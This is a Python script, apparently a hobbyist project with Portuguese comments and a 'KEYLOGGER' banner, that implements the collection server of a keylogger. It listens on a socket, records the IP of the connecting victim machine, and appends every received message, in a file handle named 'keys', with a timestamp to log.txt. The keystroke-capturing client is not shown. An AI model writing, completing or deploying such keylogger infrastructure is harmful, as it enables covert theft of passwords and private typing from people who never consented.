import socket
from datetime import datetime
print('''\033[1;31m
╦╔═╔═╗╦ ╦╦ ╔═╗╔═╗╔═╗╔═╗╦═╗ 
╠╩╗║╣ ╚╦╝║ ║ ║║ ╦║ ╦║╣ ╠╦╝ 
\033[m\033[1;34m╩ ╩╚═╝ ╩ ╩═╝╚═╝╚═╝╚═╝╚═╝╩╚═\033[m''')


host = 'localhost'  # Ip do server
port = 8082 # porta do server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((host, port))
sock.listen(1)
conn, docl = sock.accept()

if docl:
    
    print(f'\033[1;32m\n  servidor iniciado na maquina {docl[0]}')
    print('='*45)
    print('\033[m')
    with open('log.txt', 'a') as cli:
        cli.write(f'\n  servidor iniciado na maquina {docl[0]}\n{'='*45}\n')
while True:
    try:
        Menss_Rec = str(conn.recv(1024), 'utf-8')
        
        if Menss_Rec:
            timenow = datetime.now()
            print(f'[{timenow.strftime('%d/%m/%Y, %H:%M:%S')}]\033[1;31m -> \033[m{Menss_Rec}')
            with open('log.txt','a') as keys:
                keys.write(f'\n[{timenow.strftime('%d/%m/%Y, %H:%M:%S')}] -> {Menss_Rec}')
    except ConnectionResetError:
        print('\n\033[1;31mhost remoto cancelou a execução\033[m')
        break
    except KeyboardInterrupt:
        print('\n\033[1;31mvocê cancelou a execução\033[m')
        break


    